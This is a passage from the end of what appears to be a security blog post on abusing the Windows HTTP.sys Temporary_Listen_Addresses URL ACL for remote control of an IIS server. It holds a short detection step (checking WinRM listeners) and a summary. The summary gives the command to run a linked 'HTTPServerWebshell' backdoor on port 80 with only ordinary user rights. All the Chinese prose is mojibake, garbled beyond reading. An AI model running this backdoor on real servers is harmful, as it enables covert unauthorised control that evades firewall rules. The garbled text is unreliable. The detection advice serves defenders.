    URL group ID: BF00000040000120
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://+:80/TEMPORARY_LISTEN_ADDRESSES/
</code></pre></div></div>

<h3 id="2æŸ¥çœ‹winrmæœåŠ¡é…ç½®">2.æŸ¥çœ‹WinRMæœåŠ¡é…ç½®</h3>

<p>å¦‚æœæ”»å‡»è€…è·å¾—äº†ç®¡ç†å‘˜æƒé™ï¼ŒWinRMæœåŠ¡é…ç½®æœ‰å¯èƒ½è¢«æ»¥ç”¨</p>

<p>æŸ¥çœ‹ç›‘å¬é…ç½®ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
</code></pre></div></div>

<p>æŸ¥çœ‹æ˜¯å¦å¼€å¯å¯ç–‘ç«¯å£</p>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡è§£å†³äº†å¦‚ä¸‹é—®é¢˜ï¼š</p>

<p>WindowsæœåŠ¡å™¨å¼€å¯äº†IISæœåŠ¡ï¼Œé˜²ç«å¢™ä»…å…è®¸80æˆ–443ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œé‚£ä¹ˆå¦‚ä½•åœ¨ä¸ä½¿ç”¨webshellï¼Œå¹¶ä¸”åªæœ‰æ™®é€šç”¨æˆ·æƒé™ï¼Œå®ç°å¯¹è¯¥æœåŠ¡å™¨çš„è¿œç¨‹ç®¡ç†ï¼Ÿ</p>

<p>è§£å†³æ–¹æ³•:</p>

<p>ä½¿ç”¨ä»£ç ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>

<p>ä½¿ç”¨å·²æœ‰çš„url aclï¼Œå‘½ä»¤å‚æ•°å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTPServerWebshell.exe http://+:80/Temporary_Listen_Addresses/
</code></pre></div></div>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET